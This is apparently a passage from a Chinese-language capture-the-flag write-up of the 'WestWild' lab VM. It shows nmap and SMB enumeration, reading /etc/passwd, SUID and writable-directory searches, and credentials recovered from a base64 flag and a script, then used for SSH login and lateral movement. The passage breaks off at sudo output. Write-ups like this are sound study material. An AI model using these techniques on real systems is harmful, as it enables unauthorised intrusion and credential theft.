class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.107<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-25 03:11 EDT<br>Nmap scan report for 192.168.56.107<br>Host is up (0.00028s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>139/tcp open  netbios-ssn<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 2.02 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,139,445 192.168.56.107<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-25 03:11 EDT<br>Nmap scan report for 192.168.56.107<br>Host is up (0.00031s latency).<br><br>PORT    STATE SERVICE     VERSION<br>22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 6f:ee:95:91:9c:62:b2:14:cd:63:0a:3e:f8:10:9e:da (DSA)<br>|   2048 10:45:94:fe:a7:2f:02:8a:9b:21:1a:31:c5:03:30:48 (RSA)<br>|   256 97:94:17:86:18:e2:8e:7a:73:8e:41:20:76:ba:51:73 (ECDSA)<br>|_  256 23:81:c7:76:bb:37:78:ee:3b:73:e2:55:ad:81:32:72 (ED25519)<br>80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>|_http-title: Site doesnot have a title (text/html).<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: Host: WESTWILD; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: -1h00m03s, deviation: 1h43m55s, median: -3s<br>| smb2-security-mode: <br>|   3.1.1: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_nbstat: NetBIOS name: WESTWILD, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb2-time: <br>|   date: 2023-05-25T07:12:06<br>|_  start_date: N/A<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: westwild<br>|   NetBIOS computer name: WESTWILD\x00<br>|   Domain name: \x00<br>|   FQDN: westwild<br>|_  System time: 2023-05-25T10:12:06+03:00<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds<br><br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80,139,445 192.168.56.107 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-25 03:12 EDT<br>Nmap scan report for 192.168.56.107<br>Host is up (0.00024s latency).<br><br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\&#x27;s resources causing Denial Of Service.<br>|       <br>|     Disclosure date: 2009-09-17<br>|     References:<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750<br>|_      http://ha.ckers.org/slowloris/<br>|_http-stored-xss: Couldn\&#x27;t find any stored XSS vulnerabilities.<br>|_http-csrf: Couldn\&#x27;t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn\&#x27;t find any DOM based XSS.<br>139/tcp open  netbios-ssn<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>|_smb-vuln-ms10-061: false<br>|_smb-vuln-ms10-054: false<br>| smb-vuln-regsvc-dos: <br>|   VULNERABLE:<br>|   Service regsvc in Microsoft Windows systems vulnerable to denial of service<br>|     State: VULNERABLE<br>|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference<br>|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes<br>|       while working on smb-enum-sessions.<br>|_          <br><br>Nmap done: 1 IP address (1 host up) scanned in 320.92 seconds<br></code></pre></td></tr></table></figure><h2 id="smb-渗透"><a href="#smb-渗透" class="headerlink" title="smb 渗透"></a>smb 渗透</h2><p>smb 脚本扫描一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.56.107 <br>[sudo] password for kali: <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-25 03:14 EDT<br>Nmap scan report for 192.168.56.107<br>Host is up (0.000075s latency).<br>Not shown: 996 closed tcp ports (reset)<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>139/tcp open  netbios-ssn<br>445/tcp open  microsoft-ds<br>MAC Address: 08:00:27:F6:8C:99 (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: guest<br>|   \\192.168.56.107\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (WestWild server (Samba, Ubuntu))<br>|     Users: 2<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\192.168.56.107\print$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\printers<br>|     Anonymous access: &lt;none&gt;<br>|     Current user access: &lt;none&gt;<br>|   \\192.168.56.107\wave: <br>|     Type: STYPE_DISKTREE<br>|     Comment: WaveDoor<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\home\wavex\wave<br>|     Anonymous access: READ/WRITE<br>|_    Current user access: READ/WRITE<br>| smb-enum-users: <br>|   WESTWILD\aveng (RID: 1000)<br>|     Full name:   aveng<br>|     Description: <br>|     Flags:       Normal user account<br>|   WESTWILD\root (RID: 1001)<br>|     Full name:   root<br>|     Description: <br>|     Flags:       Normal user account<br>|   WESTWILD\wavex (RID: 1002)<br>|     Full name:   XxWavexX<br>|     Description: <br>|_    Flags:       Normal user account<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds<br></code></pre></td></tr></table></figure><p>尝试无密码登录，匿名登陆失败，wave 登陆成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ smbclient //192.168.56.107/anonymous<br>Enter WORKGROUP\kali\&#x27;s password: <br>tree connect failed: NT_STATUS_BAD_NETWORK_NAME<br><br>┌──(kali㉿kali)-[~]<br>└─$ smbclient //192.168.56.107/wave     <br>Enter WORKGROUP\kali\&#x27;s password: <br>Try &quot;help&quot; to get a list of possible commands.<br>smb: \&gt; ls<br>  .                                   D        0  Tue Jul 30 01:18:56 2019<br>  ..                                  D        0  Thu Aug  1 19:02:20 2019<br>  FLAG1.txt                           N       93  Mon Jul 29 22:31:05 2019<br>  message_from_aveng.txt              N      115  Tue Jul 30 01:21:48 2019<br><br>1781464 blocks of size 1024. 285752 blocks available<br></code></pre></td></tr></table></figure><p>把文件下载下来看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ smbget smb://192.168.56.107/wave/FLAG1.txt<br>Password for [kali] connecting to //wave/192.168.56.107: <br>Using workgroup WORKGROUP, user kali<br>smb://192.168.56.107/wave/FLAG1.txt                                                             <br>Downloaded 93b in 4 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ cat FLAG1.txt <br>RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K<br><br>┌──(kali㉿kali)-[~]<br>└─$ smbget smb://192.168.56.107/wave/message_from_aveng.txt<br>Password for [kali] connecting to //wave/192.168.56.107: <br>Using workgroup WORKGROUP, user kali<br>smb://192.168.56.107/wave/message_from_aveng.txt                                 <br>Downloaded 115b in 1 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ cat message_from_aveng.txt <br>Dear Wave ,<br>Am Sorry but i was lost my password ,<br>and i believe that you can reset  it for me . <br>Thank You <br>Aveng<br></code></pre></td></tr></table></figure><p>感觉是经过编码后的字符串，尝试一下 base64 解码。此外另一个文件得到了一个关键信息，或许这个用户有特殊的权限或者文件来帮助 aveng 来重置其密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ echo -e &quot;RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K&quot; | base64 -d<br>Flag1&#123;Welcome_T0_THE-W3ST-W1LD-B0rder&#125;<br>user:wavex<br>password:door+open<br><br></code></pre></td></tr></table></figure><p>得到用户名和密码，ssh 登录试试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ ssh wavex@192.168.56.107                  <br>The authenticity of host &#x27;192.168.56.107 (192.168.56.107)&#x27; can\&#x27;t be established.<br>ED25519 key fingerprint is SHA256:oeuytnbnPest0/m/OtTQyjaFSRv03+EMhBmAX886bsk.<br>This key is not known by any other names<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;192.168.56.107&#x27; (ED25519) to the list of known hosts.<br>wavex@192.168.56.107\&#x27;s password: <br>Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>  System information as of Thu May 25 10:10:12 +03 2023<br><br>  System load: 0.0               Memory usage: 3%   Processes:       92<br>  Usage of /:  77.9% of 1.70GB   Swap usage:   0%   Users logged in: 0<br><br>  Graph this data and manage this system at:<br>    https://landscape.canonical.com/<br><br>Your Hardware Enablement Stack (HWE) is supported until April 2019.<br>Last login: Fri Aug  2 02:00:40 2019<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>ssh 登录成功，进行基础的信息收集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:~$ whoami<br>wavex<br>wavex@WestWild:~$ ls<br>wave<br>wavex@WestWild:~$ pwd<br>/home/wavex<br>wavex@WestWild:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    link/ether 08:00:27:f6:8c:99 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.107/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fef6:8c99/64 scope link <br>       valid_lft forever preferred_lft forever<br>wavex@WestWild:~$ uname -a<br>Linux WestWild 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:28:33 UTC 2019 i686 athlon i686 GNU/Linux<br>wavex@WestWild:~$ sudo -l<br>[sudo] password for wavex: <br>Sorry, user wavex may not run sudo on WestWild.<br></code></pre></td></tr></table></figure><p>查看一些关键文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:~$ cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>libuuid:x:100:101::/var/lib/libuuid:<br>syslog:x:101:104::/home/syslog:/bin/false<br>mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false<br>messagebus:x:103:107::/var/run/dbus:/bin/false<br>landscape:x:104:111::/var/lib/landscape:/bin/false<br>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin<br>aveng:x:1000:1000:aveng,,,:/home/aveng:/bin/bash<br>wavex:x:1001:1001:XxWavexX,,,:/home/wavex:/bin/bash<br>wavex@WestWild:~$ cat /etc/shadow<br>cat: /etc/shadow: Permission denied<br></code></pre></td></tr></table></figure><p>.bashrc 文件也没什么收获，看看 s 权限文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:~$ find / -type f -perm -04000 -ls 2&gt;/dev/null<br> 63292   16 -rwsr-xr-x   1 root     root        13920 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>  1610    8 -rwsr-xr-x   1 root     root         5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br> 57897  484 -rwsr-xr-x   1 root     root       492972 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br> 51552  328 -rwsr-xr--   1 root     messagebus   333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>  1403   32 -rwsr-xr-x   1 root     root        30984 May 17  2017 /usr/bin/newgrp<br>  1415   48 -rwsr-xr-x   1 root     root        45420 May 17  2017 /usr/bin/passwd<br>  1520  156 -rwsr-xr-x   1 root     root       156708 May 29  2017 /usr/bin/sudo<br> 57785   72 -rwsr-xr-x   1 root     root        72860 Oct 21  2013 /usr/bin/mtr<br> 57389   20 -rwsr-xr-x   1 root     root        18136 May  8  2014 /usr/bin/traceroute6.iputils<br>  1263   36 -rwsr-xr-x   1 root     root        35916 May 17  2017 /usr/bin/chsh<br>  1334   68 -rwsr-xr-x   1 root     root        66284 May 17  2017 /usr/bin/gpasswd<br> 63296   20 -rwsr-xr-x   1 root     root        18168 Jan 15  2019 /usr/bin/pkexec<br>  1260   44 -rwsr-xr-x   1 root     root        44620 May 17  2017 /usr/bin/chfn<br> 59129   48 -rwsr-sr-x   1 daemon   daemon      46652 Oct 21  2013 /usr/bin/at<br> 58179   20 -rwsr-sr-x   1 libuuid  libuuid     17996 Nov 24  2016 /usr/sbin/uuidd<br> 58034  316 -rwsr-xr--   1 root     dip        323000 Jun 12  2018 /usr/sbin/pppd<br>    85   44 -rwsr-xr-x   1 root     root        43316 May  8  2014 /bin/ping6<br> 53426   32 -rwsr-xr-x   1 root     root        30112 May 15  2015 /bin/fusermount<br>    71   88 -rwsr-xr-x   1 root     root        88752 Nov 24  2016 /bin/mount<br>    84   40 -rwsr-xr-x   1 root     root        38932 May  8  2014 /bin/ping<br>   112   68 -rwsr-xr-x   1 root     root        67704 Nov 24  2016 /bin/umount<br>   104   36 -rwsr-xr-x   1 root     root        35300 May 17  2017 /bin/su<br> 59488   36 -rwsr-xr-x   1 root     root        34568 Jun 28  2013 /sbin/mount.cifs<br>wavex@WestWild:~$ id<br>uid=1001(wavex) gid=1001(wavex) groups=1001(wavex)<br></code></pre></td></tr></table></figure><p>定时任务呢?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:/$ cat /etc/crontab<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><br></code></pre></td></tr></table></figure><h3 id="查看用户可写目录"><a href="#查看用户可写目录" class="headerlink" title="查看用户可写目录"></a>查看用户可写目录</h3><p>依然没有收获。感觉根据另一个文件的提示，这个用户应该有一些特殊的文件和权限。</p><p>看一下这个用户可以写的目录有哪些</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:/usr/share$ find / -writable -type d 2&gt;/dev/null<br>/sys/fs/cgroup/systemd/user/1001.user/1.session<br>/usr/share/av/westsidesecret<br>/home/wavex<br>/home/wavex/.cache<br>/home/wavex/wave<br>/var/lib/php5<br>/var/spool/samba<br>/var/crash<br>/var/tmp<br>/proc/1884/task/1884/fd<br>/proc/1884/fd<br>/proc/1884/map_files<br>/run/user/1001<br>/run/shm<br>/run/lock<br>/tmp<br><br></code></pre></td></tr></table></figure><p>有个目录看起来有点意思，进去看看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">wavex@WestWild:/usr/share$ cd /usr/share/av/westsidesecret<br>wavex@WestWild:/usr/share/av/westsidesecret$ <br>wavex@WestWild:/usr/share/av/westsidesecret$ ls -liah<br>total 12K<br>69633 drwxrwxrwx 2 root  root  4.0K Jul 30  2019 .<br>69583 drwxr-xr-x 3 root  root  4.0K Jul 30  2019 ..<br>69685 -rwxrwxrwx 1 wavex wavex  101 Jul 30  2019 ififoregt.sh<br>wavex@WestWild:/usr/share/av/westsidesecret$ cat ififoregt.sh <br><span class="hljs-meta prompt_"> #</span><span class="language-bash">!/bin/bash</span> <br> figlet &quot;if i foregt so this my way&quot;<br> echo &quot;user:aveng&quot;<br> echo &quot;password:kaizen+80&quot;<br></code></pre></td></tr></table></figure><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>得到了 aveng 的用户名和密码，ssh 登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">──(kali㉿kali)-[~]<br>└─$ ssh aveng@192.168.56.107<br>aveng@192.168.56.107\&#x27;s password: <br>Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>  System information as of Thu May 25 10:19:42 +03 2023<br><br>  System load:  0.0               Processes:           106<br>  Usage of /:   77.9% of 1.70GB   Users logged in:     0<br>  Memory usage: 10%               IP address for eth0: 192.168.56.107<br>  Swap usage:   0%<br><br>  Graph this data and manage this system at:<br>    https://landscape.canonical.com/<br><br>Your Hardware Enablement Stack (HWE) is supported until April 2019.<br>Last login: Wed Jul 31 19:26:18 2019 from 192.168.59.1<br>aveng@WestWild:~$ id<br>uid=1000(aveng) gid=1000(aveng) groups=1000(aveng),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),114(lpadmin)<br>aveng@WestWild:~$ whoami<br>aveng<br>aveng@WestWild:~$ sudo -l<br>[sudo] password for aveng: <br>Matching Defaults entries for aveng on WestWild:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User aveng may run the following commands on WestWild:<br>    